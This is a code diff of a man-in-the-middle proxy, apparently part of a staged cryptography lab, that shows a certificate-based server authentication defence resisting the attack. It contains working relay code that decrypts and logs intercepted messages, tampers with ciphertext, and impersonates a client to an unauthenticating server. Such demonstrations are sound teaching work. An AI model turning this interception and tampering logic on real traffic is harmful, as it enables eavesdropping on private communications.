@@ -3,6 +3,10 @@
 #include "crypto_utils.h"
 #include "aes_gcm.h"
 #include "base64.h"
+#include "pki.h"
+#include "handshake.h"
+#include "net_io.h"
+#include "openssl_raii.h"
 
 #include <arpa/inet.h>
 #include <netinet/in.h>
@@ -14,16 +18,6 @@
 #include <array>
 #include <atomic>
 
-bool send_all(int sock, const std::string& data) {
-    size_t total_sent = 0;
-    while (total_sent < data.size()) {
-        ssize_t sent = send(sock, data.data() + total_sent, data.size() - total_sent, 0);
-        if (sent <= 0) return false;
-        total_sent += static_cast<size_t>(sent);
-    }
-    return true;
-}
-
 void relay_loop(
     int sock_in, int sock_out,
     const std::array<unsigned char, AES_KEY_SIZE>& key_in,
@@ -31,135 +25,171 @@ void relay_loop(
     const std::string& label,
     std::atomic<bool>& running
 ) {
-    char buffer[BUFFER_SIZE];
     std::string pending;
-
     while (running) {
-        ssize_t bytes = recv(sock_in, buffer, sizeof(buffer), 0);
-        if (bytes <= 0) {
+        std::string raw_line;
+        if (!read_line(sock_in, pending, raw_line)) {
             std::cout << "\n[" << label << "] Disconnected.\n";
             running = false;
             break;
         }
+        try {
+            std::string plaintext = decrypt_message(key_in, base64_decode(raw_line));
+            std::cout << "[MITM INTERCEPT - " << label << "] " << plaintext << "\n";
 
-        pending.append(buffer, bytes);
-
-        while (true) {
-            size_t nl = pending.find('\n');
-            if (nl == std::string::npos) break;
-
-            std::string raw_line = pending.substr(0, nl);
-            pending.erase(0, nl + 1);
-
-            try {
-                // Decrypt using the sender's key
-                std::string plaintext = decrypt_message(key_in, base64_decode(raw_line));
-                
-                // Log the intercepted plaintext to the terminal
-                std::cout << "[MITM INTERCEPT - " << label << "] " << plaintext << "\n";
-
-                // Re-encrypt using the receiver's key
-                std::string new_blob = encrypt_message(key_out, plaintext);
-
-                // Tamper with the ciphertext if the plaintext contains a specific trigger
-                // If the user types a message containing "TRIGGER_TAMPER", flip a bit.
-                if (plaintext.find("TRIGGER_TAMPER") != std::string::npos) {
-                    std::cout << "[MITM] Tampering with ciphertext bit...\n";
-                    new_blob[12] ^= 0x01; // Corrupt first byte of ciphertext (after 12-byte nonce)
-                }
-
-                // Forward the frame
-                std::string b64 = base64_encode(new_blob) + "\n";
-                send_all(sock_out, b64);
-
-            } catch (const std::exception& e) {
-                std::cerr << "[" << label << "] Relay error: " << e.what() << "\n";
-                running = false;
-                break;
+            std::string new_blob = encrypt_message(key_out, plaintext);
+            if (plaintext.find("TRIGGER_TAMPER") != std::string::npos) {
+                std::cout << "[MITM] Tampering with ciphertext bit...\n";
+                new_blob[12] ^= 0x01;
             }
+            send_line(sock_out, base64_encode(new_blob));
+        } catch (const std::exception& e) {
+            std::cerr << "[" << label << "] Relay error: " << e.what() << "\n";
+            running = false;
+            break;
         }
     }
 }
 
+// Attempts to pose as the SERVER to a victim client, presenting Mallory's
+// own self-signed (non-CA-signed) certificate. A correctly implemented
+// Phase 3 client MUST reject this before sending anything further
+bool attempt_pose_as_server(
+    int client_sock,
+    X509* fake_cert,
+    EVP_PKEY* fake_key,
+    std::array<unsigned char, AES_KEY_SIZE>& session_key_out
+) {
+    std::string pending;
+
+    std::string cert_pem = certificate_to_pem(fake_cert);
+    if (!send_line(client_sock, "CERT " + base64_encode(cert_pem))) {
+        std::cout << "[MITM] Victim disconnected before we could send our fake CERT.\n";
+        return false;
+    }
+    std::cout << "[MITM] Sent self-signed (non-CA-signed) certificate to victim.\n";
+
+    std::string line;
+    if (!read_line(client_sock, pending, line)) {
+        std::cout << "[MITM] Victim closed the connection without sending a CHALLENGE.\n"
+                   << "[MITM] This is the EXPECTED, correct outcome: the client's "
+                      "certificate signature check failed against its trusted CA \n";
+        return false;
+    }
+
+    if (!starts_with(line, "CHALLENGE ")) {
+        std::cout << "[MITM] Unexpected message instead of CHALLENGE: " << line << "\n";
+        return false;
+    }
+
+    std::cout << "[MITM] WARNING: victim proceeded past certificate validation with "
+                 "an uncertified cert — this would indicate a bug in the victim's "
+                 "validation logic, not an expected outcome. Continuing to show impact.\n";
+
+    std::string challenge = line.substr(10);
+    std::string signature = sign_challenge(fake_key, challenge);
+    if (!send_line(client_sock, "SIG " + base64_encode(signature))) return false;
+
+    if (!read_line(client_sock, pending, line) || !starts_with(line, "DH_INIT ")) return false;
+    std::string client_pub = line.substr(8);
+
+    DiffieHellman dh;
+    dh.generate_keypair();
+    if (!send_line(client_sock, "DH_ACK " + dh.get_public_value_hex())) return false;
+
+    std::string shared_secret = dh.compute_shared_secret(client_pub);
+    session_key_out = derive_key(shared_secret);
+    std::cout << "[MITM] Fully hijacked victim session.\n";
+    return true;
+}
+
 int main(int argc, char* argv[]) {
-    if (argc != 3) {
-        std::cerr << "Usage: " << argv[0] << " <real_server_ip> <real_server_port>\n";
+    if (argc != 6) {
+        std::cerr << "Usage: " << argv[0]
+                  << " <real_server_ip> <real_server_port> <ca_cert_path> "
+                     "<expected_server_cn> <mallory_fake_cert_dir>\n"
+                  << "  <mallory_fake_cert_dir> must contain fake.crt/fake.key\n"
+                  << "  (generate via mallory/generate_fake_cert.sh)\n";
         return 1;
     }
 
     std::string real_ip = argv[1];
     int real_port = std::stoi(argv[2]);
-    int proxy_port = 5001; // The port the client will connect to
+    std::string ca_cert_path = argv[3];
+    std::string expected_cn = argv[4];
+    std::string fake_dir = argv[5];
 
-    // 1. Setup Proxy Listener
+    X509_ptr fake_cert;
+    EVP_PKEY_ptr fake_key;
+    try {
+        fake_cert = load_certificate(fake_dir + "/fake.crt");
+        fake_key = load_private_key(fake_dir + "/fake.key");
+    } catch (const std::exception& e) {
+        std::cerr << "[MITM] Failed to load Mallory's fake identity: " << e.what() << "\n";
+        return 1;
+    }
+
+    int proxy_port = 5001;
     int proxy_server_sock = socket(AF_INET, SOCK_STREAM, 0);
     int opt = 1;
     setsockopt(proxy_server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
-    
+
     sockaddr_in proxy_addr{};
     proxy_addr.sin_family = AF_INET;
     proxy_addr.sin_addr.s_addr = INADDR_ANY;
     proxy_addr.sin_port = htons(proxy_port);
-    
     bind(proxy_server_sock, (sockaddr*)&proxy_addr, sizeof(proxy_addr));
     listen(proxy_server_sock, 1);
-    
-    std::cout << "[MITM] Listening on port " << proxy_port << "...\n";
-    int client_sock = accept(proxy_server_sock, nullptr, nullptr);
-    std::cout << "[MITM] Client connected.\n";
 
-    // 2. Connect to Real Server
+    std::cout << "[MITM] Listening on port " << proxy_port
+              << " — point a victim client here instead of the real server.\n";
+    int client_sock = accept(proxy_server_sock, nullptr, nullptr);
+    std::cout << "[MITM] Victim client connected.\n\n";
+
+    std::cout << "--- Attempt 1: pose as SERVER to the victim client ---\n";
+    std::array<unsigned char, AES_KEY_SIZE> key_client;
+    bool posed_as_server_ok = attempt_pose_as_server(client_sock, fake_cert.get(), fake_key.get(), key_client);
+
+    std::cout << "\n--- Attempt 2: pose as CLIENT to the real server ---\n";
+    // Only added SERVER authentication — the server still doesn't
+    // authenticate clients, so this half of a Phase-2-style MITM still
+    // works exactly as before.
     int server_sock = socket(AF_INET, SOCK_STREAM, 0);
     sockaddr_in server_addr{};
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(real_port);
     inet_pton(AF_INET, real_ip.c_str(), &server_addr.sin_addr);
-    
-    if (connect(server_sock, (sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+
+    std::array<unsigned char, AES_KEY_SIZE> key_server;
+    bool posed_as_client_ok = false;
+    if (connect(server_sock, (sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
+        std::string pending_to_server;
+        posed_as_client_ok = client_perform_handshake(
+            server_sock, pending_to_server, ca_cert_path, expected_cn, key_server);
+    } else {
         std::cerr << "[MITM] Failed to connect to real server.\n";
-        return 1;
     }
-    std::cout << "[MITM] Connected to real server.\n";
 
-    // 3. Hijack Client Handshake
-    char buf[BUFFER_SIZE];
-    ssize_t n = recv(client_sock, buf, sizeof(buf), 0); // Reads client DH_INIT
-    if(n <= 0) { std::cerr << "[MITM] Failed to read client DH_INIT\n"; return 1; }
-    std::string client_init(buf, n); // length-bounded, not null-terminated
-    std::string client_pub = client_init.substr(8, client_init.find('\n') - 8);
-    
-    DiffieHellman dh_proxy_client;
-    dh_proxy_client.generate_keypair();
-    std::string proxy_client_ack = "DH_ACK " + dh_proxy_client.get_public_value_hex() + "\n";
-    send_all(client_sock, proxy_client_ack);
-    
-    std::string secret_client = dh_proxy_client.compute_shared_secret(client_pub);
-    auto key_client = derive_key(secret_client);
+    std::cout << "\n========== ATTACK SUMMARY ==========\n"
+              << "Pose as SERVER to victim : "
+              << (posed_as_server_ok ? "SUCCEEDED (unexpected!)" : "FAILED (expected — Phase 3 defense holds)") << "\n"
+              << "Pose as CLIENT to server : "
+              << (posed_as_client_ok ? "SUCCEEDED (server has no client-auth requirement)" : "FAILED") << "\n"
+              << "=====================================\n\n";
 
-    // 4. Hijack Server Handshake
-    DiffieHellman dh_proxy_server;
-    dh_proxy_server.generate_keypair();
-    std::string proxy_server_init = "DH_INIT " + dh_proxy_server.get_public_value_hex() + "\n";
-    send_all(server_sock, proxy_server_init);
-    
-    n = recv(server_sock, buf, sizeof(buf), 0); // Reads server DH_ACK
-    if(n <= 0) { std::cerr << "[MITM] Failed to read server DH_ACK\n"; return 1; }
-    std::string server_ack(buf, n); // length bounded
-    std::string server_pub = server_ack.substr(7, server_ack.find('\n') - 7);
-    
-    std::string secret_server = dh_proxy_server.compute_shared_secret(server_pub);
-    auto key_server = derive_key(secret_server);
+    if (posed_as_server_ok && posed_as_client_ok) {
+        std::cout << "[MITM] Both halves succeeded — relaying (should not be reachable "
+                     "against a correct Phase 3 client).\n";
+        std::atomic<bool> running(true);
+        std::thread t1(relay_loop, client_sock, server_sock, key_client, key_server, "C->S", std::ref(running));
+        std::thread t2(relay_loop, server_sock, client_sock, key_server, key_client, "S->C", std::ref(running));
+        t1.join();
+        t2.join();
+    } else {
+        std::cout << "[MITM] Attack could not be fully completed — this contrast with "
+                     "Phase 2 (where it succeeded).\n";
+    }
 
-    std::cout << "[MITM] Handshakes hijacked successfully. Relaying plaintext...\n";
-
-    // 5. Start bidirectional relay
-    std::atomic<bool> running(true);
-    std::thread t1(relay_loop, client_sock, server_sock, key_client, key_server, "C->S", std::ref(running));
-    std::thread t2(relay_loop, server_sock, client_sock, key_server, key_client, "S->C", std::ref(running));
-
-    t1.join();
-    t2.join();
-    
     close(client_sock);
     close(server_sock);
     close(proxy_server_sock);
